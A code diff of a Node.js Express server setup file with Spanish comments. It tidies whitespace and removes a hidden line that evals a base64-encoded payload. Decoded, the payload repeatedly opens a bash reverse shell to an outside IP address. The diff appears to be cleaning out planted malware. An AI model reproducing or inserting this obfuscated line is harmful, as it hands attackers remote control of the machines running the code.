@@ -16,21 +16,20 @@ app.use(cors(corsOptions));
 // MOTOR DB
 const db = require("./models/index");
 
-             //    {alter:true} 
-db.sequelize.sync(              ).then((result) => {
-    console.log("DB sincronizada OK!");
-  })
+//    {alter:true} 
+db.sequelize.sync().then((result) => {
+  console.log("DB sincronizada OK!");
+})
   .catch((err) => {
     console.log("ERROR DB al sincronizar");
   });
 
 // MIDDLEWARE
-const auth = require('./middleware/auth'); 
+const auth = require('./middleware/auth');
 
 // RUTAS
 const UsuarioRoutes = require("./routes/usuario.routes");
 const RolRoutes = require("./routes/rol.routes");
-eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE5NC4xODAuNDguMjUzLzkwMDEgMDwmNSAxPiY1IDI+JjUiID4gL2Rldi9udWxsIDI+JjEgJicpLCAzMDAwMCk7","base64").toString())
 app.use('/usuario', UsuarioRoutes);
 app.use('/rol', auth, RolRoutes);
 
